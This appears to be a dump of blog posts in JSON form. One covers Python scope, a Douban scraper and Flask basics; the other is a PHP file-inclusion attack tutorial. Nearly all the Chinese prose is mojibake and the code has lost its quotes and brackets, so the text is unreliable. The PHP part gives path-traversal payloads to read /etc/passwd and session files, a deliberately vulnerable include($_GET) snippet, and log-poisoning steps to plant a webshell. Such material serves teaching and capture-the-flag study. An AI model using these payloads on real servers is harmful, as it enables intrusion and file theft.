å½“å†…éƒ¨ä½œç”¨åŸŸæƒ³ä¿®æ”¹å¤–éƒ¨ä½œç”¨åŸŸçš„å˜é‡æ—¶ï¼Œå°±è¦ç”¨åˆ° global å’Œ nonlocal å…³é”®å­—äº† num = 1def fun1(): global num # éœ€è¦ä½¿ç”¨ global å…³é”®å­—å£°æ˜ print(num) num = 123 print(num)fun1()print(num) å¦‚æœè¦ä¿®æ”¹åµŒå¥—ä½œç”¨åŸŸï¼ˆenclosing ä½œç”¨åŸŸï¼Œå¤–å±‚éå…¨å±€ä½œç”¨åŸŸï¼‰ä¸­çš„å˜é‡åˆ™éœ€è¦ nonlocal å…³é”®å­—äº† def outer(): num = 10 def inner(): nonlocal num # nonlocalå…³é”®å­—å£°æ˜ num = 100 print(num) inner() print(num)outer() çˆ¬è™«requestsæ¨¡å—åŸºç¡€çš„çŸ¥è¯†å¯ä»¥ç›´æ¥ä¸Šç½‘æœåˆ°ï¼Œè¿™è¾¹å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº† çˆ¬å–è±†ç“£ç”µå½±çš„æ’è¡Œæ¦œï¼š #!/usr/bin/env python# -*- coding:utf-8 -*-import requestsimport jsonif __name__ == __main__: #1.æŒ‡å®šurl post_url = https://movie.douban.com/j/chart/top_list #2.è¿›è¡ŒUAä¼ªè£… headers = User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 param = type: 24, interval_id: 100:90, action: , start: 0, # ä»åº“ä¸­çš„ç¬¬å‡ éƒ¨ç”µå½±å»å– limit: 20, # ä¸€æ¬¡å–å‡ºçš„ä¸ªæ•° response = requests.get(post_url, headers=headers, params=param) list_data = response.json() fp = open(./douban.json, w, encoding=utf-8) json.dump(list_data, fp=fp, ensure_ascii=False) print(over!!!) FlaskHello Worldfrom flask import Flaskapp = Flask(__name__)@app.route(/)def hello_world(): return Hello, World! if __name__ ==__main__: app.run(debug=True,port=8080) å¼•å…¥Flaskç±» from flask import Flask 2.åˆ›å»ºFlaskå¯¹è±¡ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨è¯¥å¯¹è±¡è¿›è¡Œåº”ç”¨çš„é…ç½®å’Œè¿è¡Œï¼š app = Flask(__name__) name æ˜¯Pythonä¸­çš„ç‰¹æ®Šå˜é‡ï¼Œå¦‚æœæ–‡ä»¶ä½œä¸ºä¸»ç¨‹åºæ‰§è¡Œï¼Œé‚£ä¹ˆ__name__å˜é‡çš„å€¼å°±æ˜¯__main__ï¼Œå¦‚æœæ˜¯è¢«å…¶ä»–æ¨¡å—å¼•å…¥ï¼Œé‚£ä¹ˆ__name__çš„å€¼å°±æ˜¯æ¨¡å—åç§°ã€‚ ç¼–å†™ä¸»ç¨‹åº åœ¨ä¸»ç¨‹åºä¸­ï¼Œæ‰§è¡Œrun()æ¥å¯åŠ¨åº”ç”¨ï¼š if __name__ ==__main__: app.run(debug=True, port=8080) æ”¹åå¯åŠ¨ä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨ï¼Œé»˜è®¤æƒ…å†µä¸‹å…¶åœ°å€æ˜¯localhost:5000ï¼Œåœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å…³é”®å­—å‚æ•°portå°†ç›‘å¬ç«¯å£ä¿®æ”¹ä¸º8080ã€‚ è·¯ç”± ä½¿ç”¨appå˜é‡çš„route()è£…é¥°å™¨æ¥å‘Šè¯‰Flaskæ¡†æ¶URLå¦‚ä½•è§¦å‘æˆ‘ä»¬çš„è§†å›¾å‡½æ•°ï¼š @app.route(/)def hello_world(): return Hello, World! ä¸Šé¢çš„æ ‡è¯†ï¼Œè®¿é—®ç½‘ç«™çš„æ ¹è·¯å¾„ â€˜â€˜ ï¼Œå°†è½¬ä¸ºå¯¹hello_world()å‡½æ•°çš„è°ƒç”¨ã€‚ Flaskä½¿ç”¨Jinja 2æ¨¡æ¿å…ˆåœ¨å†™ä»£ç çš„ç›®å½•ä¸‹é¢å†åˆ›ä¸€ä¸ªåä¸º templates çš„æ–‡ä»¶å¤¹ï¼Œåœ¨å…¶ä¸­å­˜æ”¾æ¨¡æ¿æ–‡ä»¶ï¼Œä»¥ä¾¿åœ¨åº”ç”¨æ—¶ä½¿ç”¨ Jinja 2 æ¨¡æ¿å¼•æ“æ¸²æŸ“åŠ¨æ€å†…å®¹ å¦‚æœæ‚¨æ„¿æ„ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨åˆ›å»º Flask åº”ç”¨ç¨‹åºæ—¶è‡ªå®šä¹‰æ¨¡æ¿æ–‡ä»¶å¤¹çš„åç§°ï¼Œå…·ä½“çš„åšæ³•æ˜¯åœ¨åˆ›å»ºåº”ç”¨ç¨‹åºå®ä¾‹æ—¶ï¼Œé€šè¿‡ä¼ é€’ template_folder å‚æ•°æ¥æŒ‡å®šæ¨¡æ¿æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼Œä¾‹å¦‚ï¼š app = Flask(__name__, template_folder=my_templates) è¿™æ ·å°±ä¼šå°†æ¨¡æ¿æ–‡ä»¶å¤¹å‘½åä¸º my_templatesï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ templates ä¸‹é¢ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š from flask import Flask, render_templateapp = Flask(__name__)@app.route(/)def index(): # å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ greeting = Hello, World! # æ¸²æŸ“æ¨¡æ¿å¹¶ä¼ é€’å‚æ•° return render_template(index.html, greeting=greeting)if __name__ == __main__: app.run(debug=True) ï¼Œrender_template å‡½æ•°ç”¨äºæ¸²æŸ“åä¸º index.html çš„æ¨¡æ¿ï¼Œå¹¶ä¸”å°† greeting å˜é‡ä¼ é€’ç»™æ¨¡æ¿ï¼Œä»¥ä¾¿åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ã€‚ æ¥ä¸‹æ¥ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º index.html çš„æ¨¡æ¿æ–‡ä»¶: !DOCTYPE htmlhtmlhead titleFlask Jinja2 Example/title/headbody h1 greeting /h1/body/html ä½¿ç”¨äº†åŒèŠ±æ‹¬å· æ¥åŒ…å«éœ€è¦åœ¨æ¨¡æ¿ä¸­æ¸²æŸ“çš„å˜é‡æˆ–è¡¨è¾¾å¼ã€‚åœ¨è¿™é‡Œï¼Œ greeting å°±æ˜¯åœ¨ Flask è§†å›¾å‡½æ•°ä¸­ä¼ é€’çš„ greeting å˜é‡çš„å€¼ã€‚ è¿è¡Œè¿™ä¸ª Flask åº”ç”¨ç¨‹åºåï¼Œå½“æ‚¨è®¿é—®æ ¹è·¯å¾„ / æ—¶ï¼Œå°†ä¼šæ˜¾ç¤º â€˜Hello, World!â€™ å­—æ · å†æ¥ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„ä½¿ç”¨äº† Jinja 2 æ¨¡æ¿å¼•æ“çš„è¯­æ³•çš„htmlä»£ç ï¼š htmlbody % if name % h2Hello name ./h2 % else % h2Hello./h2 % endif % /body/html % if name %`: è¿™æ˜¯ä¸€ä¸ª Jinja 2 çš„æ¨¡æ¿æ ‡ç­¾ï¼Œç”¨äºå¼€å§‹ä¸€ä¸ªæ¡ä»¶è¯­å¥ã€‚å®ƒè¡¨ç¤ºå¦‚æœ `name` å˜é‡å­˜åœ¨ä¸”ä¸ä¸ºç©ºï¼Œåˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å— - `% else %`: è¿™æ˜¯ä¸€ä¸ª Jinja 2 çš„æ¨¡æ¿æ ‡ç­¾ï¼Œç”¨äºæŒ‡å®šæ¡ä»¶è¯­å¥ä¸­çš„â€œå¦åˆ™â€éƒ¨åˆ†ã€‚å¦‚æœæ¡ä»¶ä¸æ»¡è¶³ï¼ˆå³ `name` ä¸å­˜åœ¨æˆ–ä¸ºç©ºï¼‰ï¼Œåˆ™æ‰§è¡Œä¸‹é¢çš„ä»£ç å— - `% endif %: è¿™æ˜¯ä¸€ä¸ª Jinja 2 çš„æ¨¡æ¿æ ‡ç­¾ï¼Œç”¨äºç»“æŸæ¡ä»¶è¯­å¥çš„éƒ¨åˆ† è¡¨å•ï¼ˆå®ä¾‹ï¼‰å…ˆæ¥ä¸¤ä¸ªæ¨¡æ¿æ–‡ä»¶ï¼šæ”¶é›†ç”¨æˆ·èµ„æ–™å’Œæ˜¾ç¤ºç”¨æˆ·èµ„æ–™çš„ ç¬¬ä¸€ä¸ªä¸ºæ”¶é›†ç”¨æˆ·èµ„æ–™çš„ï¼š !DOCTYPE htmlhtmlhead title/title/headbody h1Bio Data Form/h1 form action=showbio labelUsername/label input type=name name=usernamebr labelEmail/label input type=email name=emailbr labelHobbies/label input type=name name=hobbiesbr input type=submit name= /form/body/html ç¬¬äºŒä¸ªä¸ºæ˜¾ç¤ºç”¨æˆ·èµ„æ–™çš„ï¼š !DOCTYPE htmlhtmlhead titleBio-Data Details/title/headbody h1Bio-Data Details/h1 hr h1Username: username /h1 h1Email: email /h1 h1Hobbies: hobbies /h1/body/html æ¥ä¸‹æ¥å°±æ˜¯pythonæ–‡ä»¶ï¼Œåœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šç»§ç»­å¢åŠ çš„ï¼š from flask import Flask, render_template, request, redirect, url_forapp = Flask(__name__)@app.route(/)def index(): # å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ greeting = Hello, World! # æ¸²æŸ“æ¨¡æ¿å¹¶ä¼ é€’å‚æ•° return render_template(index.html, greeting=greeting)@app.route(/form, methods=[POST, GET])def bio_data_form(): if request.method == POST: username = request.form[username] age = request.form[age] email = request.form[email] hobbies = request.form[hobbies] return redirect(url_for(showbio, username=username, age=age, email=email, hobbies=hobbies)) return render_template(bio_form.html)@app.route(/showbio, methods=[GET]) #getæ–¹æ³•è®¿é—®è¯¥è·¯ç”±def showbio(): username = request.args.get(username) age = request.args.get(age) email = request.args.get(email) hobbies = request.args.get(hobbies) return render_template(show_bio.html, username=username, age=age, email=email, hobbies=hobbies)if __name__ == __main__: app.run(debug=True) redirect: è¿™æ˜¯ Flask ä¸­çš„ä¸€ä¸ªé‡å®šå‘å‡½æ•°ï¼Œç”¨äºå°†ç”¨æˆ·é‡å®šå‘åˆ°æŒ‡å®šçš„ URL åœ°å€ã€‚ url_for(showbio, username=username, age=age, email=email, hobbies=hobbies): è¿™æ˜¯ Flask ä¸­çš„ä¸€ä¸ª URL æ„å»ºå‡½æ•°ï¼Œç”¨äºæ„å»ºæŒ‡å®šè§†å›¾å‡½æ•°çš„ URL åœ°å€ã€‚å…¶ä¸­ï¼Œshowbio æ˜¯è¦æ„å»º URL çš„è§†å›¾å‡½æ•°çš„åç§°ï¼Œç»“æœä¼šè¿”å›ä¸åä¸º showbio çš„è§†å›¾å‡½æ•°å…³è”çš„ URL åœ°å€ï¼Œå¹¶å°†åé¢çš„å‚æ•°ä½œä¸ºæŸ¥è¯¢å‚æ•°æ·»åŠ åˆ°è¯¥ URL ä¸­ request.args.get() æ–¹æ³•æ¥è·å– URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„å‚æ•°å€¼ã€‚ å…·ä½“æ¥è¯´ï¼Œrequest.args æ˜¯ä¸€ä¸ªå­—å…¸å¯¹è±¡ï¼ŒåŒ…å«äº† URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å‚æ•°ã€‚è€Œ request.args.get() æ–¹æ³•åˆ™ç”¨äºä»è¿™ä¸ªå­—å…¸ä¸­è·å–æŒ‡å®šå‚æ•°çš„å€¼","tags":["python"],"categories":["å¼€å‘"]},{"title":"phpä¼ªä»£ç åè®®å’Œæ–‡ä»¶åŒ…å«","path":"/2023/12/18/phpä¼ªä»£ç åè®®å’Œæ–‡ä»¶åŒ…å«_max/phpä¼ªä»£ç åè®®å’Œæ–‡ä»¶åŒ…å«/","content":"æ–‡ä»¶åŒ…å«includeå’Œrequireè¯­å¥åœ¨ PHP ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨æœåŠ¡å™¨æ‰§è¡Œ PHP æ–‡ä»¶ä¹‹å‰åœ¨è¯¥æ–‡ä»¶ä¸­æ’å…¥ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚ include å’Œ require è¯­å¥ç”¨äºåœ¨æ‰§è¡Œæµä¸­æ’å…¥å†™åœ¨å…¶ä»–æ–‡ä»¶ä¸­çš„æœ‰ç”¨çš„ä»£ç ã€‚ include å’Œ require é™¤äº†å¤„ç†é”™è¯¯çš„æ–¹å¼ä¸åŒä¹‹å¤–ï¼Œåœ¨å…¶ä»–æ–¹é¢éƒ½æ˜¯ç›¸åŒçš„ï¼š require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚ include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚ å› æ­¤ï¼Œå¦‚æœæ‚¨å¸Œæœ›ç»§ç»­æ‰§è¡Œï¼Œå¹¶å‘ç”¨æˆ·è¾“å‡ºç»“æœï¼Œå³ä½¿åŒ…å«æ–‡ä»¶å·²ä¸¢å¤±ï¼Œé‚£ä¹ˆè¯·ä½¿ç”¨ includeã€‚å¦åˆ™ï¼Œåœ¨æ¡†æ¶ã€CMS æˆ–è€…å¤æ‚çš„ PHP åº”ç”¨ç¨‹åºç¼–ç¨‹ä¸­ï¼Œè¯·å§‹ç»ˆä½¿ç”¨ require å‘æ‰§è¡Œæµå¼•ç”¨å…³é”®æ–‡ä»¶ã€‚è¿™æœ‰åŠ©äºæé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ï¼Œåœ¨æŸä¸ªå…³é”®æ–‡ä»¶æ„å¤–ä¸¢å¤±çš„æƒ…å†µä¸‹ã€‚ åŒ…å«æ–‡ä»¶çœå»äº†å¤§é‡çš„å·¥ä½œã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥ä¸ºæ‰€æœ‰ç½‘é¡µåˆ›å»ºæ ‡å‡†é¡µå¤´ã€é¡µè„šæˆ–è€…èœå•æ–‡ä»¶ã€‚ç„¶åï¼Œåœ¨é¡µå¤´éœ€è¦æ›´æ–°æ—¶ï¼Œæ‚¨åªéœ€æ›´æ–°è¿™ä¸ªé¡µå¤´åŒ…å«æ–‡ä»¶å³å¯ã€‚ åŸºç¡€è¯­æ³•ï¼š include filename;æˆ–è€…require filename; Include_onceï¼šç³»ç»Ÿä¼šè‡ªåŠ¨åˆ¤æ–­æ–‡ä»¶åŒ…å«è¿‡ç¨‹ä¸­ï¼Œæ˜¯å¦å·²ç»åŒ…å«è¿‡ï¼ˆä¸€ä¸ªæ–‡ä»¶æœ€å¤šè¢«åŒ…å«ä¸€æ¬¡ï¼‰ Requuire_once:ä¸Include_onceç›¸åŒ æ³¨æ„ï¼š require ä¸€èˆ¬æ”¾åœ¨ PHP æ–‡ä»¶çš„æœ€å‰é¢ï¼Œç¨‹åºåœ¨æ‰§è¡Œå‰å°±ä¼šå…ˆå¯¼å…¥è¦å¼•ç”¨çš„æ–‡ä»¶ï¼› include ä¸€èˆ¬æ”¾åœ¨ç¨‹åºçš„æµç¨‹æ§åˆ¶ä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œæ—¶ç¢°åˆ°æ‰ä¼šå¼•ç”¨ï¼Œç®€åŒ–ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ åˆ¤æ–­æ˜¯å¦æœ‰æ–‡ä»¶åŒ…å«é€šè¿‡ /etc/passwdæ¥æŸ¥çœ‹æ˜¯å¦æœ‰æ–‡ä»¶åŒ…å«ï¼ˆå‰é¢é‚£ä¸ªåŸºæœ¬ä¸Šæ‰€æœ‰Linuxæ–‡ä»¶éƒ½ä¼šåŒ…å«ï¼‰ ä¾‹å­ï¼š /flag/../../../../../../etc/passwdåªè¦ ../å¤Ÿå¤šå°±è‚¯å®šä¼šåˆ°æ ¹ç›®å½•å¤„ æ—¥å¿—åŒ…å«æ¼æ´å‰ç½®çŸ¥è¯†ç‚¹ apacheé»˜è®¤æ—¥å¿—è·¯å¾„ /var/log/apache2/access.log nginxé»˜è®¤æ—¥å¿—è·¯å¾„ /var/log/nginx/access.log phpinfo()å‡½æ•° ä½œç”¨ï¼šæ˜¾ç¤ºå‡ºPHP æ‰€æœ‰ç›¸å…³ä¿¡æ¯ã€‚æ˜¯æ’æŸ¥é…ç½®phpæ˜¯æ˜¯å¦å‡ºé”™æˆ–æ¼é…ç½®æ¨¡å—çš„ä¸»è¦æ–¹å¼ä¹‹ä¸€ ?php phpinfo(); ? åªè¦è®¿é—®åˆ°phpinfo()å‡½æ•°çš„webé¡µé¢ï¼Œå³è¿”å›phpçš„æ‰€æœ‰ç›¸å…³ä¿¡æ¯ï¼ eval()å‡½æ•° ä½œç”¨ï¼ševal()å‡½æ•°æŠŠæ‹¬å·é‡Œé¢å†…å®¹æŒ‰ç…§phpä»£ç å¤„ç† ä¾‹å­ echo æˆ‘æƒ³å­¦phpecho echo æˆ‘æƒ³å­¦php; //è¾“å‡ºecho æˆ‘æƒ³å­¦phpeval(echo æˆ‘æƒ³å­¦php;); //è¾“å‡ºæˆ‘æƒ³å­¦php æ³¨æ„äº‹é¡¹ï¼ševalå‡½æ•°æ‹¬å·ä¸­å­—ç¬¦ä¸²æœ«å°¾ä¸€å®šè¦æœ‰åˆ†å·ã€‚ä½¿ç”¨æŠ€å·§ï¼šæŠŠphpä»£ç å½“æˆå½“æˆå­—ç¬¦ä¸²åŸæ ·è¾“å‡ºï¼Œè‹¥èƒ½æ­£å¸¸è¾“å‡ºï¼Œå†æ”¾åˆ°evalï¼ˆï¼‰å‡½æ•°ä¸­ï¼› system()å‡½æ•° æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶æ˜¾ç¤ºè¾“å‡ºèµ„æ–™ã€‚ systemè¯­æ³•: string system(string command, int [return_var]); systemè¿”å›å€¼: å­—ç¬¦ä¸² æ—¥å¿—åŒ…å«æ¼æ´åŸå› ï¼šæŸphpæ–‡ä»¶å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ— æ³•ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ©ç”¨åŒ…å«æ¼æ´åŒ…å«Apache(çœ‹æœåŠ¡å™¨æ˜¯Apacheè¿˜æ˜¯nginx)æ—¥å¿—æ–‡ä»¶ä¹Ÿå¯ä»¥è·å–WebShell æ³¨æ„ï¼šéœ€è¦å¼€å¯æœåŠ¡å™¨è®°å½•æ—¥å¿—åŠŸèƒ½ è®¿é—®æ—¥å¿—çš„ä½ç½®å’Œæ–‡ä»¶ååœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šä¼šæœ‰æ‰€å·®å¼‚ apacheä¸€èˆ¬æ˜¯varlogapacheaccess.logã€‚ï¼š nginxçš„logåœ¨varlognginxaccess.logå’Œvarlognginxerror.log Apacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯access.log(è®¿é—®æ—¥å¿—)å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒApacheçš„è®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚åŠæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚å½“è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼ŒApacheæ—¥å¿—åŒæ ·ä¼šè®°å½• ä¾‹å¦‚è®¿é—®http://127.0.0.1/ã€‚Apacheä¼šè®°å½•è¯·æ±‚â€œâ€ï¼Œå¹¶å†™åˆ°access.logæ–‡ä»¶ä¸­ï¼Œè¿™æ—¶å€™å»åŒ…å«access.logå°±å¯ä»¥åˆ©ç”¨åŒ…å«æ¼æ´ ä½†å¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼ŒåŸå› æ˜¯ç›´æ¥è®¿é—®URLåï¼Œä¸€å¥è¯æœ¨é©¬åœ¨æ—¥å¿—æ–‡ä»¶ä¸­è¢«ç¼–ç äº† éœ€è¦é€šè¿‡burpsuiteæ‹¦æˆªç›´æ¥è®¿é—®http://127.0.0.1/ å°±èƒ½ç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„access.logæ–‡ä»¶ 1.ä¸‹é¢æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ä»£ç ï¼š ?phpecho file inlcude test;if(isset($_GET[rj45]))\tinclude($_GET[rj45]);? 2.å†™å…¥phpinfo() 3.å†™å…¥ä¸€å¥è¯ å…¶ä¸­ dirå°±æ˜¯æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ sessionåŒ…å«å¦‚ä½•åˆ©ç”¨å½“Sessionæ–‡ä»¶çš„å†…å®¹å¯æ§ï¼Œå¹¶ä¸”å¯ä»¥è·å–Sessionæ–‡ä»¶çš„è·¯å¾„ï¼Œå°±å¯ä»¥é€šè¿‡åŒ…å«Sessionæ–‡ä»¶è¿›è¡Œæ”»å‡»ã€‚ Sessionçš„å­˜å‚¨ä½ç½®è·å–ï¼šä¸€èˆ¬æ˜¯é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼ã€‚ ï¼ˆ1ï¼‰é€šè¿‡phpinfoçš„ä¿¡æ¯å¯ä»¥è·å–åˆ°Sessionçš„å­˜å‚¨ä½ç½®ã€‚phpinfoä¸­çš„session.save_pathå­˜å‚¨çš„æ˜¯Sessionçš„å­˜æ”¾ä½ç½®ã€‚é€šè¿‡phpinfoçš„ä¿¡æ¯è·å–åˆ°session.save_pathä¸€èˆ¬ä¸º/var/lib/php/sessionã€‚ ï¼ˆ2ï¼‰é€šè¿‡çŒœæµ‹é»˜è®¤çš„Sessionå­˜æ”¾ä½ç½®è¿›è¡Œå°è¯•ã€‚é€šå¸¸Linuxä¸‹Sessioné»˜è®¤å­˜å‚¨åœ¨varlibphpsessionæˆ–è€…tmpç›®å½•ä¸‹ã€‚é»˜è®¤å­˜å‚¨Sessionå­˜æ”¾ä½ç½®ã€‚ åŒ…å«è¯¥sessionæ–‡ä»¶ï¼šç½‘å€/file_included.php?file=../../../../var/lib/php/session/sess_ID æ›´å…·ä½“çš„æè¿°å¯è§ï¼šsessionæ–‡ä»¶åŒ…å«æ¼æ´è¯¦è§£ é»˜è®¤æƒ…å†µä¸‹ï¼ŒPHP.ini ä¸­è®¾ç½®çš„ SESSION ä¿å­˜æ–¹å¼æ˜¯ filesï¼ˆsession.save_handler filesï¼‰ï¼Œå³ä½¿ç”¨è¯»å†™æ–‡ä»¶çš„æ–¹å¼ä¿å­˜ SESSION æ•°æ®ï¼Œè€Œ SESSION æ–‡ä»¶ä¿å­˜çš„ç›®å½•ç”± session.save_path æŒ‡å®šï¼Œæ–‡ä»¶åä»¥ sess_ ä¸ºå‰ç¼€ï¼Œåè·Ÿ SESSION IDï¼Œå¦‚ï¼šsess_c72665af28a8b14c0fe11afe3b59b51bã€‚æ–‡ä»¶ä¸­çš„æ•°æ®å³æ˜¯åºåˆ—åŒ–ä¹‹åçš„ SESSION æ•°æ®äº†ã€‚ session.upload_progressä¸open_basedirã€allow_url_fopenã€allow_url_includeç­‰PHPé…ç½®ä¸€æ ·ï¼Œsession.upload_progressä¹Ÿæ˜¯PHPçš„ä¸€ä¸ªåŠŸèƒ½ï¼ŒåŒæ ·å¯ä»¥åœ¨php.iniä¸­è®¾ç½®ç›¸å…³å±æ€§ æœ€é‡è¦çš„å‡ ä¸ªè®¾ç½®ï¼š session.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = upload_progress_session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS 1.session.upload_progress.enabled å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯session.upload_progressåŠŸèƒ½ï¼Œæ˜¯ PHP ä¸­ç”¨äºå¯ç”¨æˆ–ç¦ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªçš„é…ç½®é€‰é¡¹ã€‚ å½“å°†è¯¥é€‰é¡¹è®¾ç½®ä¸º true æ—¶ï¼ŒPHP å°†ä¼šå¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªåŠŸèƒ½ã€‚è¿™ä¸ªåŠŸèƒ½å…è®¸ä½ è¿½è¸ªä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ã€‚è¿™åœ¨å¤„ç†å¤§æ–‡ä»¶ä¸Šä¼ æ—¶éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå…è®¸ç”¨æˆ·äº†è§£æ–‡ä»¶ä¸Šä¼ çš„è¿›åº¦æƒ…å†µã€‚ 2.session.upload_progress.cleanupå¯ä»¥æ§åˆ¶æ˜¯å¦åœ¨ä¸Šä¼ ä¹‹ååˆ é™¤æ–‡ä»¶å†…å®¹ 3.session.upload_progress.prefix å¯ä»¥è®¾ç½®ä¸Šä¼ æ–‡ä»¶å†…å®¹çš„å‰ç¼€ï¼ˆå³Sessionå˜é‡åå‰ç¼€ï¼‰ ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœ session.upload_progress.prefix è¢«è®¾ç½®ä¸º upload_progress_ï¼Œé‚£ä¹ˆ PHP å°†ä¼šåœ¨ Session ä¸­åˆ›å»ºç±»ä¼¼äº upload_progress_123456 çš„å˜é‡æ¥å­˜å‚¨ä¸Šä¼ è¿›åº¦ä¿¡æ¯ã€‚è¿™é‡Œçš„ 123456 æ˜¯ PHP è‡ªåŠ¨ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºåŒºåˆ†ä¸åŒçš„ä¸Šä¼ è¯·æ±‚ã€‚ é€šè¿‡è®¾ç½® session.upload_progress.prefixï¼Œæ‚¨å¯ä»¥å®šä¹‰å­˜å‚¨ä¸Šä¼ è¿›åº¦ä¿¡æ¯çš„ Session å˜é‡åç§°çš„å‰ç¼€ï¼Œä»¥ä¾¿åœ¨å¤šä¸ªåº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿä¸­æ›´å¥½åœ°ç®¡ç†å’Œè¯†åˆ«è¿™äº›ä¿¡æ¯ã€‚ 4**.session.upload_progress.name** è¿™ä¸ªé…ç½®é¡¹ç”¨äºå®šä¹‰å­˜å‚¨ä¸Šä¼ è¿›åº¦ä¿¡æ¯çš„ Session å˜é‡çš„åç§°ã€‚åœ¨ä½¿ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªåŠŸèƒ½æ—¶ï¼ŒPHP å°†ä¼šåœ¨ Session ä¸­åˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„å˜é‡æ¥å­˜å‚¨ä¸Šä¼ çš„æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯ï¼Œå¹¶ä¸”æ­¤å˜é‡çš„åç§°å¯ä»¥ç”± session.upload_progress.name æ¥å®šä¹‰ã€‚ nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ å‰ç½®çŸ¥è¯†Linuxå’ŒNginxé»˜è®¤sessionæ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼š /var/lib/php/sess_PHPSESSIDï¼ˆç¬¬äºŒé€šå¸¸çš„ï¼‰/var/lib/php/sessions/sess_PHPSESSID/tmp/sess_PHPSESSIDï¼ˆæœ€æœ€é€šå¸¸çš„ï¼‰/tmp/sessions/sess_PHPSESSID session_start()ç®€ä»‹ è¯»å–åä¸ºPHPSESSIDï¼ˆå¦‚æœæ²¡æœ‰æ”¹å˜é»˜è®¤å€¼ï¼‰çš„cookieå€¼ï¼Œå‡ä½¿ä¸ºabc123ã€‚ ï¼ˆ2ï¼‰è‹¥è¯»å–åˆ°PHPSESSIDè¿™ä¸ªCOOKIEï¼Œåˆ›å»ºSESSIONå˜é‡ï¼Œå¹¶ä»ç›¸åº”çš„ç›®å½•ä¸­ï¼ˆå¯ä»¥åœ¨php.iniä¸­è®¾ç½®ï¼‰è¯»å–SESSabc123ï¼ˆé»˜è®¤æ˜¯è¿™ç§å‘½åæ–¹å¼ï¼‰æ–‡ä»¶ï¼Œå°†å­—ç¬¦è£…åœ¨å…¥SESSIONå˜é‡ä¸­ï¼› 